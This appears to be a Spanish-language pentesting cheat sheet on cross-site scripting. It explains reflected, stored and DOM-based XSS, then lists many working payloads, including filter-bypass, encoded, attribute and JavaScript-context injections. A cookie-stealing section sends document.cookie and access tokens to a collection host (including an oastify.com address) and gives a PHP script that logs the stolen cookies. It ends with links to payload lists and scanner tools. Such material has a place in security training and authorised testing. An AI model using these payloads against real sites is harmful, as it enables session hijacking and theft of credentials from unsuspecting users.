# Cross-Site Scripting

## Tipos

Hay 3 tipos principales de ataques XSS:

- **XSS reflejado**: en un ataque XSS reflejado, el código malicioso se incrusta en un enlace que se envía a la víctima. Cuando la víctima hace clic en el enlace, el código se ejecuta en su navegador. Por ejemplo, un atacante podría crear un enlace que contenga JavaScript malicioso y enviárselo a la víctima en un correo electrónico. Cuando la víctima hace clic en el enlace, el código JavaScript se ejecuta en su navegador, lo que permite al atacante realizar varias acciones, como robar sus credenciales de inicio de sesión.
- **XSS almacenado**: En un ataque XSS almacenado, el código malicioso se almacena en el servidor y se ejecuta cada vez que se accede a la página vulnerable. Por ejemplo, un atacante podría inyectar un código malicioso en un comentario de una publicación de blog. Cuando otros usuarios ven la publicación del blog, el código malicioso se ejecuta en sus navegadores, lo que permite al atacante realizar varias acciones.
- **XSS basado en DOM**: es un tipo de ataque XSS que ocurre cuando una aplicación web vulnerable modifica el DOM (Document Object Model) en el navegador del usuario. Esto puede suceder, por ejemplo, cuando se usa una entrada de usuario para actualizar el código HTML o JavaScript de la página de alguna manera. En un ataque XSS basado en DOM, el código malicioso no se envía al servidor, sino que se ejecuta directamente en el navegador del usuario. Esto puede dificultar la detección y prevención de este tipo de ataques, ya que el servidor no tiene ningún registro del código malicioso.

## CASOS DE EXPLOTACION

### basic payloads

Es mejor usar `alert(document.domain)` o `alert(window.origin)` en lugar de `alert(1)` como carga útil XSS predeterminada para saber en qué ámbito se está ejecutando realmente el XSS y detectar el uso de **dominios sandbox**.

Desafortunadamente, hay un pequeño problema si usas Chrome. Desde la versión 92 en adelante (20 de julio de 2021), se impide que los iframes de origen cruzado llamen a `alert()`. Como estos se usan para construir algunos de los ataques XSS más avanzados, a veces necesitará usar una carga útil de PoC alternativa. En este escenario, recomendamos la función `print()`.


```html
<script>alert(1);</script>
<marquee>saludos</marquee>
<script>alert(document.domain);</script>
<script>alert(window.origin);</script>
<script>debugger;</script>
<script>print();</script>
<script>prompt(1);</script>
<script>alert(document.domain.concat("\n").concat(window.origin))</script>
```

Si bien `alert()`es bueno para XSS reflejado, puede convertirse rápidamente en una carga para XSS almacenado porque requiere cerrar la ventana emergente para cada ejecución, por lo que `console.log()`puede usarse en su lugar para mostrar un mensaje en la consola de la consola del desarrollador (no requiere ninguna interacción) .

```html
<script>console.log("Test");</script>
<script>console.log("Test\n".concat(document.domain).concat("\n").concat(window.origin))</script>
```

### common payloads

```javascript
// Basic payload
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<script>\u0061lert('22')</script>
<script>eval('\x61lert(\'33\')')</script>
<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">

// Img payload
<img src=x onerror=alert('XSS');>
<img src/onerror=print()>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>

// Svg payload
<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)
<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
<svg><script>alert('33')
<svg><script>alert&lpar;'33'&rpar;

// Div payload
<div onpointerover="alert(45)">MOVE HERE</div>
<div onpointerdown="alert(45)">MOVE HERE</div>
<div onpointerenter="alert(45)">MOVE HERE</div>
<div onpointerleave="alert(45)">MOVE HERE</div>
<div onpointermove="alert(45)">MOVE HERE</div>
<div onpointerout="alert(45)">MOVE HERE</div>
<div onpointerup="alert(45)">MOVE HERE</div>
```

### STEALING COOKIES (CAPTURADOR DE DATOS)

Obtiene la cookie de administrador o el token de acceso confidencial, la siguiente carga útil lo enviará a una página controlada.

```html
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>

<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
<script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
```

el archivo `cookie.php` escribe los datos recopilados en un archivo:

```bash
php -S 127.0.0.1:80
```

```php
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>
```

### STEALING COOKIES WITH CORS

```HTML
<script>
  fetch('https://536ebr0pyrhacdwchh4hhfg0wr2hq6.oastify.com', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
  });
</script>
```

### XSS DEFACEMENT PAGE

- [[Pentesting Javascript]]

#### Otras maneras

Más exploits en [http://www.xss-payloads.com/payloads-list.html?a#category=all](http://www.xss-payloads.com/payloads-list.html?a#category=all) :

-   [Tomar capturas de pantalla usando XSS y HTML5 Canvas](https://www.idontplaydarts.com/2012/04/taking-screenshots-using-xss-and-the-html5-canvas/)
-   [Escáner de puertos JavaScript](http://www.gnucitizen.org/blog/javascript-port-scanner/)
-   [Escáner de red](http://www.xss-payloads.com/payloads/scripts/websocketsnetworkscan.js.html)
-   [Ejecución de shell .NET](http://www.xss-payloads.com/payloads/scripts/dotnetexec.js.html)
-   [Formulario de redirección](http://www.xss-payloads.com/payloads/scripts/redirectform.js.html)
-   [Reproducir música](http://www.xss-payloads.com/payloads/scripts/playmusic.js.html)

### XSS en atributos HTML

```bash
javascript:alert(1)
javascript:print()

#using new line characters
java%0ascript:alert(1)   - LF (\n)
java%09script:alert(1)   - Horizontal tab (\t)
java%0dscript:alert(1)   - CR (\r)

#escape character
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)

# encode the "javascript:" in Hex/Octal
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
\152\141\166\141\163\143\162\151\160\164\072alert(1)

# Using the newline and a comment //
javascript://%0Aalert(1)
javascript://anything%0D%0A%0D%0Awindow.alert(1)
```

la funcion `attr()` de JQuery se usa para configurar atributos de objetos HTML:

```javascript
$(function() {
	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});
```

la funcion `setAttribute` de JS nativo hace lo mismo:

```javascript
// <button>Hello World</button>

const button = document.querySelector("button");
button.setAttribute("name", "helloButton");
```

### XSS JQuery selector

Otro sink potencial a tener en cuenta es la función de selección `$()` de jQuery, que se puede usar para inyectar objetos maliciosos en el DOM.

```html
<img src/onerror="alert(1)">
```

### XSS bypass caracteres (<>) encodeados

Algunas paginas convierten los caracteres mayor y menos a entidades HTML:

- `>` ==> `&gt;`
- `<` ==> `&lt;`

con esto no podemos usar etiquetas `<script>` para nuestros payloads, aqui tenemos que ver la posibilidad de agregar atributos o eventos como payload:

```javascript
test" onmouseover="alert(1)
test" onclick="alert(1)
test" onkeydown="alert(1)
test" href="javascript:alert(1)
```

### XSS in JS variable (JS context)

puede que un punto de inyeccion sea una variable de JS:

![[Pasted image 20230223194854.png]]

podemos usar los siguientes payloads:

```javascript
';alert('XSS');//

'-alert(1)-'
```

## Diccionario de Payloads

[https://github.com/payloadbox/xss-payload-list](https://github.com/payloadbox/xss-payload-list)

## Herramientas

[https://github.com/s0md3v/XSStrike](https://github.com/s0md3v/XSStrike)
[https://github.com/rajeshmajumdar/BruteXSS](https://github.com/rajeshmajumdar/BruteXSS)
[http://xss-scanner.com/](http://xss-scanner.com/)
[https://tools.kali.org/web-applications/xsser](https://tools.kali.org/web-applications/xsser)
[https://github.com/DanMcInerney/xsscrapy](https://github.com/DanMcInerney/xsscrapy)

## Automatización

Podemos automatizar con burpsuite en la opcion del intruder, primero creamos un archivo con  varios payload XSS, colocamos como payload el **"id"** de la url, acrgamos el archivo de payload y lo ejecutamos 

### XSStrike

Descargar el repositorio.

Instalar requerimientos: (trabaja con python3)

```
pip3 install -r requirements
```

ejecucion:

```
python3 xsstrike.py -u <url>
```

url = https://...../id=1

- [USO XSStrike](https://github.com/s0md3v/XSStrike/wiki/Usage)
